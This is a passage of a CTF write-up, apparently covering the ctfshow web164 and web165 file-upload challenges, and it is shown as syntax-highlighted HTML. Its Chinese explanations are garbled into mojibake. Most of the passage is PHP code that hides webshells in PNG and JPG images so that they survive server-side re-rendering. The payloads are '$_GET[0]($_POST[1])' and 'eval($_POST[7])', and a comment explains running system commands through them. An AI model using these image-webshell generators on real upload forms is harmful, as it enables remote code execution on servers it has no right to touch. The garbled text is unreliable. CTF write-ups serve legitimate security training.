requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#web164-pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)"></a>web164(pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“)</h4><p>è¿™ä¸€å…³è€ƒå¯Ÿpngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼Œç»è¿‡ä¸Šä¼ å›¾ç‰‡åå†æ¬¡å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ç»è¿‡å¯¹æ¯”ï¼Œä½¿ç”¨010editorå‘ç°ç»è¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼Œå¾ˆå¤šåœ°æ–¹çš„æ•°æ®éƒ½</p><p>ä¸ä¸€æ ·äº†</p><blockquote><p>æ‰€è°“äºŒæ¬¡æ¸²æŸ“ï¼Œå°±æ˜¯ç½‘ç«™å°†ç”¨æˆ·æ‰€ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç”±äºå„ç§åŸå› ï¼ˆé€‚é…ç½‘ç«™æ˜¾ç¤ºï¼Œé˜²æ­¢æœ¨é©¬ï¼‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå¯¹äºŒæ¬¡æ¸²</p><p>æŸ“çš„ç»•è¿‡å³å°†æºæ–‡ä»¶ä¸ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾å‡ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®ä½ç½®ï¼Œå°†åé—¨ä»£ç æ’å…¥æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„æ•°æ®çš„ä½ç½®ã€‚å¯¹äº</p><p>ç»•è¿‡äºŒæ¬¡æ¸²æŸ“ï¼Œäººå·¥ç»•è¿‡å‡ ä¹ä¸å¯èƒ½ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨è„šæœ¬æ¥è¿›è¡Œæ„å»ºå›¾ç‰‡é©¬ã€‚</p></blockquote><p>æŸä¸çŸ¥åä½¬å†™çš„ä»£ç ,å‚è€ƒ<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-æ–‡ä»¶ä¸Šä¼ </a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span> <span class="token comment">/* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨</span><span class="token comment">//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡</span><span class="token comment">//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);</span><span class="token comment">//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           åˆ›å»º1.pngå›¾ç‰‡æˆåŠŸï¼      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpgäºŒæ¬¡æ¸²æŸ“"><a href="#web165-jpgäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web165(jpgäºŒæ¬¡æ¸²æŸ“)"></a>web165(jpgäºŒæ¬¡æ¸²æŸ“)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token comment">//æ³¨æ„$è½¬ä¹‰</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 